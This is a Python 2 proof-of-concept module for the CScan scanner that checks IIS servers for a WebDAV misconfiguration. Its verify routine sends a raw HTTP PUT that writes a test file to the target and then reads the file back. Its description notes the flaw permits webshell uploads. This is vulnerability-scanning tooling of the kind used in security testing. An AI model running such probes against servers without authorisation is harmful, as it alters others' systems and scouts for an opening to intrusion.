# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import socket
import time
import urllib2

class Vuln(ABVuln):
    poc_id = '36be6143-b8fc-40b8-bb59-8a579e776cbb'
    name = 'IIS WebDav 配置不当' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        开启了WebDav且配置不当可导致攻击者直接上传webshell，进而导致服务器被入侵控制。
    ''' # 漏洞描述
    ref = 'Unknown' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'IIS'  # 漏洞组件名称
    product_version = 'IIS WebDav '  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1414a6b9-f23a-4991-920a-4fd671c98940' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 10
            arg = '{target}'.format(target=self.target)
            url = urlparse.urlparse(arg)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ip = socket.gethostbyname(url.hostname)
            port = url.port if url.port else 80
            s.connect((ip, port))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\ncscan233\r\n\r\n" % (ip,port)
            s.send(flag)
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                vul_url = arg + '/vultest.txt'
                request = urllib2.Request(vul_url)
                res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
                if 'cscan233' in res_html:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()